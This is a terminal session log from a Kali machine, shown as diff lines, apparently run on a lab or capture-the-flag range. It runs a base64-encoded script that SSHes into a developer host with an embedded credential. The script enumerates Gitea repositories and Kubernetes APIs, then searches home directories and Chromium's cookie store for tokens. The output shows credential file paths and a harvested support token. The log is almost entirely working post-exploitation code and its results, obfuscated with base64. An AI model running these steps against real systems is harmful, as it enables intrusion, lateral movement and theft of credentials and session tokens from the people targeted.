@@ -1,0 +1,138 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r4.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKRz1odHRwczovL3NvdXJjZS5rZXBsZXJvcHMudGVzdApVPSdyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvJwplY2hvICI9PT0gR0lURUEgVVNFUi9PUkdTID09PSIKY3VybCAtc1NrIC1tIDEwIC11ICIkVSIgIiRHL2FwaS92MS91c2VyIiB8IGhlYWQgLWMgNTAwOyBlY2hvCmN1cmwgLXNTayAtbSAxMCAtdSAiJFUiICIkRy9hcGkvdjEvb3JncyIgfCBoZWFkIC1jIDgwMDsgZWNobwpjdXJsIC1zU2sgLW0gMTAgLXUgIiRVIiAiJEcvYXBpL3YxL3VzZXIvcmVwb3M/bGltaXQ9NTAiIHwgcHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxqc29uOyBkPWpzb24ubG9hZChzeXMuc3RkaW4pOyBwcmludCgiXG4iLmpvaW4oclsiZnVsbF9uYW1lIl0gZm9yIHIgaW4gZCkpJyAyPiYxIHwgaGVhZCAtNjAKZWNobyAiPT09IEdJVEVBIFNFQVJDSCByZXBvcyA9PT0iCmZvciBxIGluIGNsb3VkIHdvcmtsb2FkIHRydXN0IGlkZW50aXR5IGV4cG9ydCBzdXBwb3J0IGZpZWxkbGluayBmaWVsZGtlc3Q7IGRvCiBlY2hvICItLSBxPSRxIgogY3VybCAtc1NrIC1tIDEwIC11ICIkVSIgIiRHL2FwaS92MS9yZXBvcy9zZWFyY2g/cT0kcSZsaW1pdD0zMCIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247CnRyeToKIGQ9anNvbi5sb2FkKHN5cy5zdGRpbik7IHByaW50KCIgIi5qb2luKHJbImZ1bGxfbmFtZSJdIGZvciByIGluIGQuZ2V0KCJkYXRhIixbXSkpKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6IHByaW50KCJFUlIiLGUpJyAyPiYxIHwgaGVhZCAtNQpkb25lCmVjaG8gIj09PSBLOFMgRElTQ09WRVJZID09PSIKa3ViZWN0bCBnZXQgLS1yYXcgL2FwaXMgMj4mMSB8IGhlYWQgLWMgMjUwMDsgZWNobwprdWJlY3RsIGFwaS1yZXNvdXJjZXMgLS1uYW1lc3BhY2VkPXRydWUgMj4mMSB8IGhlYWQgLTQwCmt1YmVjdGwgYXBpLXJlc291cmNlcyAtLW5hbWVzcGFjZWQ9ZmFsc2UgMj4mMSB8IGhlYWQgLTMwCmVjaG8gIj09PSBLOFMgUkFXIEFQSVMvR1JPVVBTID09PSIKZm9yIGcgaW4gIiIgYXBwcyBiYXRjaCBjbG91ZC5rZXBsZXJvcHMudGVzdCBrZXBsZXJvcHMuaW8gaWRlbnRpdHkua2VwbGVyb3BzLnRlc3Qgd29ya2xvYWRzLmtlcGxlcm9wcy50ZXN0OyBkbwogZWNobyAiLS0gL2FwaXMvJGciOyBrdWJlY3RsIGdldCAtLXJhdyAiL2FwaXMvJGciIDI+JjEgfCBoZWFkIC1jIDYwMDsgZWNobwpkb25lCmVjaG8gIj09PSBTRUFSQ0ggSE9NRSBGT1IgVE9LRU5TID09PSIKZ3JlcCAtcklsIC1pIC1FICd3b3JrbG9hZHx0cnVzdHxhdWRpZW5jZXx0b2tlbi1leGNoYW5nZXxma198YmVhcmVyJyB+Ly5jb25maWcgfi8ubG9jYWwgfi93b3JrIDI+L2Rldi9udWxsIHwgaGVhZCAtMzAKZWNobyAiPT09IENIUk9NSVVNIFRPS0VOUyA9PT0iCmZpbmQgfi8uY29uZmlnL2Nocm9taXVtIC10eXBlIGYgLW1heGRlcHRoIDMgMj4vZGV2L251bGwgfCBoZWFkIC0yMApncmVwIC1hRW8gJ2ZrX1tBLVphLXowLTlfLV17MTAsfXxGTEFHXHtbMC05YS1mXXsxNn1cfXxleUpbQS1aYS16MC05Xy4tXXsyMCx9JyB+Ly5jb25maWcvY2hyb21pdW0vRGVmYXVsdC8qIDI+L2Rldi9udWxsIHwgaGVhZCAtMjAKUlNICmVjaG8gRE9ORV9LMTRfUjQK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r4.sh; bash /tmp/k14_r4.sh; echo DONEMARK_1795199267554$((6*7))
+=== GITEA USER/ORGS ===
+{"id":2,"login":"rowan.ito","login_name":"rowan.ito","source_id":0,"full_name":"","email":"rowan.ito@fieldkest.test","avatar_url":"https://source.keplerops.test/avatars/22792951efb602102be25ae04a599a14","html_url":"https://source.keplerops.test/rowan.ito","language":"","is_admin":false,"last_login":"1970-01-01T00:00:00Z","created":"2026-11-19T07:07:33Z","restricted":false,"active":true,"prohibit_login":false,"location":"","website":"","description":"","visibility":"public","followers_count":0,"f
+[]
+
+fieldkest/connector-archive
+fieldkest/fieldlink-connector
+fieldkest/policy-compiler
+fieldkest/release-signer-history
+=== GITEA SEARCH repos ===
+-- q=cloud
+
+-- q=workload
+
+-- q=trust
+
+-- q=identity
+
+-- q=export
+
+-- q=support
+
+-- q=fieldlink
+fieldkest/fieldlink-connector
+-- q=fieldkest
+
+=== K8S DISCOVERY ===
+{"kind":"APIGroupList","apiVersion":"v1","groups":[{"name":"apiregistration.k8s.io","versions":[{"groupVersion":"apiregistration.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"apiregistration.k8s.io/v1","version":"v1"}},{"name":"apps","versions":[{"groupVersion":"apps/v1","version":"v1"}],"preferredVersion":{"groupVersion":"apps/v1","version":"v1"}},{"name":"events.k8s.io","versions":[{"groupVersion":"events.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"events.k8s.io/v1","version":"v1"}},{"name":"authentication.k8s.io","versions":[{"groupVersion":"authentication.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"authentication.k8s.io/v1","version":"v1"}},{"name":"authorization.k8s.io","versions":[{"groupVersion":"authorization.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"authorization.k8s.io/v1","version":"v1"}},{"name":"autoscaling","versions":[{"groupVersion":"autoscaling/v2","version":"v2"},{"groupVersion":"autoscaling/v1","version":"v1"}],"preferredVersion":{"groupVersion":"autoscaling/v2","version":"v2"}},{"name":"batch","versions":[{"groupVersion":"batch/v1","version":"v1"}],"preferredVersion":{"groupVersion":"batch/v1","version":"v1"}},{"name":"certificates.k8s.io","versions":[{"groupVersion":"certificates.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"certificates.k8s.io/v1","version":"v1"}},{"name":"networking.k8s.io","versions":[{"groupVersion":"networking.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"networking.k8s.io/v1","version":"v1"}},{"name":"policy","versions":[{"groupVersion":"policy/v1","version":"v1"}],"preferredVersion":{"groupVersion":"policy/v1","version":"v1"}},{"name":"rbac.authorization.k8s.io","versions":[{"groupVersion":"rbac.authorization.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"rbac.authorization.k8s.io/v1","version":"v1"}},{"name":"storage.k8s.io","versions":[{"groupVersion":"storage.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"storage.k8s.io/v1","version":"v1"}},{"name":"admissionregistration.k8s.io","versions":[{"groupVersion":"admissionregistration.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"admissionregistration.k8s.io/v1","version":"v1"}},{"name":"apiextensions.k8s.io","versions":[{"groupVersion":"apiextensions.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"apiextensions.k8s.io/v1","version":"v1"}},{"name":"scheduling.k8s.io","versions":[{"gro
+NAME                        SHORTNAMES   APIVERSION                     NAMESPACED   KIND
+bindings                                 v1                             true         Binding
+configmaps                  cm           v1                             true         ConfigMap
+endpoints                   ep           v1                             true         Endpoints
+events                      ev           v1                             true         Event
+limitranges                 limits       v1                             true         LimitRange
+persistentvolumeclaims      pvc          v1                             true         PersistentVolumeClaim
+pods                        po           v1                             true         Pod
+podtemplates                             v1                             true         PodTemplate
+replicationcontrollers      rc           v1                             true         ReplicationController
+resourcequotas              quota        v1                             true         ResourceQuota
+secrets                                  v1                             true         Secret
+serviceaccounts             sa           v1                             true         ServiceAccount
+services                    svc          v1                             true         Service
+controllerrevisions                      apps/v1                        true         ControllerRevision
+daemonsets                  ds           apps/v1                        true         DaemonSet
+deployments                 deploy       apps/v1                        true         Deployment
+replicasets                 rs           apps/v1                        true         ReplicaSet
+statefulsets                sts          apps/v1                        true         StatefulSet
+localsubjectaccessreviews                authorization.k8s.io/v1        true         LocalSubjectAccessReview
+horizontalpodautoscalers    hpa          autoscaling/v2                 true         HorizontalPodAutoscaler
+cronjobs                    cj           batch/v1                       true         CronJob
+jobs                                     batch/v1                       true         Job
+podcertificaterequests                   certificates.k8s.io/v1         true         PodCertificateRequest
+leases                                   coordination.k8s.io/v1         true         Lease
+endpointslices                           discovery.k8s.io/v1            true         EndpointSlice
+events                      ev           events.k8s.io/v1               true         Event
+backendtlspolicies          btlspolicy   gateway.networking.k8s.io/v1   true         BackendTLSPolicy
+gateways                    gtw          gateway.networking.k8s.io/v1   true         Gateway
+grpcroutes                               gateway.networking.k8s.io/v1   true         GRPCRoute
+httproutes                               gateway.networking.k8s.io/v1   true         HTTPRoute
+listenersets                lset         gateway.networking.k8s.io/v1   true         ListenerSet
+referencegrants             refgrant     gateway.networking.k8s.io/v1   true         ReferenceGrant
+tcproutes                                gateway.networking.k8s.io/v1   true         TCPRoute
+tlsroutes                                gateway.networking.k8s.io/v1   true         TLSRoute
+udproutes                                gateway.networking.k8s.io/v1   true         UDPRoute
+helmchartconfigs            hcc          helm.cattle.io/v1              true         HelmChartConfig
+helmcharts                  hc           helm.cattle.io/v1              true         HelmChart
+addons                                   k3s.cattle.io/v1               true         Addon
+pods                                     metrics.k8s.io/v1beta1         true         PodMetrics
+NAME                                SHORTNAMES   APIVERSION                        NAMESPACED   KIND
+componentstatuses                   cs           v1                                false        ComponentStatus
+namespaces                          ns           v1                                false        Namespace
+nodes                               no           v1                                false        Node
+persistentvolumes                   pv           v1                                false        PersistentVolume
+mutatingadmissionpolicies                        admissionregistration.k8s.io/v1   false        MutatingAdmissionPolicy
+mutatingadmissionpolicybindings                  admissionregistration.k8s.io/v1   false        MutatingAdmissionPolicyBinding
+mutatingwebhookconfigurations                    admissionregistration.k8s.io/v1   false        MutatingWebhookConfiguration
+validatingadmissionpolicies                      admissionregistration.k8s.io/v1   false        ValidatingAdmissionPolicy
+validatingadmissionpolicybindings                admissionregistration.k8s.io/v1   false        ValidatingAdmissionPolicyBinding
+validatingwebhookconfigurations                  admissionregistration.k8s.io/v1   false        ValidatingWebhookConfiguration
+customresourcedefinitions           crd,crds     apiextensions.k8s.io/v1           false        CustomResourceDefinition
+apiservices                                      apiregistration.k8s.io/v1         false        APIService
+selfsubjectreviews                               authentication.k8s.io/v1          false        SelfSubjectReview
+tokenreviews                                     authentication.k8s.io/v1          false        TokenReview
+selfsubjectaccessreviews                         authorization.k8s.io/v1           false        SelfSubjectAccessReview
+selfsubjectrulesreviews                          authorization.k8s.io/v1           false        SelfSubjectRulesReview
+subjectaccessreviews                             authorization.k8s.io/v1           false        SubjectAccessReview
+certificatesigningrequests          csr          certificates.k8s.io/v1            false        CertificateSigningRequest
+clustertrustbundles                              certificates.k8s.io/v1            false        ClusterTrustBundle
+flowschemas                                      flowcontrol.apiserver.k8s.io/v1   false        FlowSchema
+prioritylevelconfigurations                      flowcontrol.apiserver.k8s.io/v1   false        PriorityLevelConfiguration
+gatewayclasses                      gc           gateway.networking.k8s.io/v1      false        GatewayClass
+etcdsnapshotfiles                                k3s.cattle.io/v1                  false        ETCDSnapshotFile
+nodes                                            metrics.k8s.io/v1beta1            false        NodeMetrics
+ingressclasses                                   networking.k8s.io/v1              false        IngressClass
+ipaddresses                         ip           networking.k8s.io/v1              false        IPAddress
+servicecidrs                                     networking.k8s.io/v1              false        ServiceCIDR
+runtimeclasses                                   node.k8s.io/v1                    false        RuntimeClass
+clusterrolebindings                              rbac.authorization.k8s.io/v1      false        ClusterRoleBinding
+=== K8S RAW APIS/GROUPS ===
+-- /apis/
+{"kind":"APIGroupList","apiVersion":"v1","groups":[{"name":"apiregistration.k8s.io","versions":[{"groupVersion":"apiregistration.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"apiregistration.k8s.io/v1","version":"v1"}},{"name":"apps","versions":[{"groupVersion":"apps/v1","version":"v1"}],"preferredVersion":{"groupVersion":"apps/v1","version":"v1"}},{"name":"events.k8s.io","versions":[{"groupVersion":"events.k8s.io/v1","version":"v1"}],"preferredVersion":{"groupVersion":"events.k8s.io/v1","version":"v1"}},{"name":"authentication.k8s.io","versions":[{"groupVersion":"authenticat
+-- /apis/apps
+{"kind":"APIGroup","apiVersion":"v1","name":"apps","versions":[{"groupVersion":"apps/v1","version":"v1"}],"preferredVersion":{"groupVersion":"apps/v1","version":"v1"}}
+
+-- /apis/batch
+{"kind":"APIGroup","apiVersion":"v1","name":"batch","versions":[{"groupVersion":"batch/v1","version":"v1"}],"preferredVersion":{"groupVersion":"batch/v1","version":"v1"}}
+
+-- /apis/cloud.keplerops.test
+Error from server (NotFound): the server could not find the requested resource
+
+-- /apis/keplerops.io
+Error from server (NotFound): the server could not find the requested resource
+
+-- /apis/identity.keplerops.test
+Error from server (NotFound): the server could not find the requested resource
+
+-- /apis/workloads.keplerops.test
+Error from server (NotFound): the server could not find the requested resource
+
+=== SEARCH HOME FOR TOKENS ===
+/home/rowan/.config/git/credentials
+/home/rowan/.config/fieldlink/support-client.json
+/home/rowan/work/local-helper.md
+/home/rowan/work/platform-access.md
+=== CHROMIUM TOKENS ===
+/home/rowan/.config/chromium/Default/Cookies
+/home/rowan/.config/chromium/Default/Preferences
+/home/rowan/.config/chromium/Default/History
+/home/rowan/.config/chromium/Default/Cookies:fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b
+DONE_K14_R4
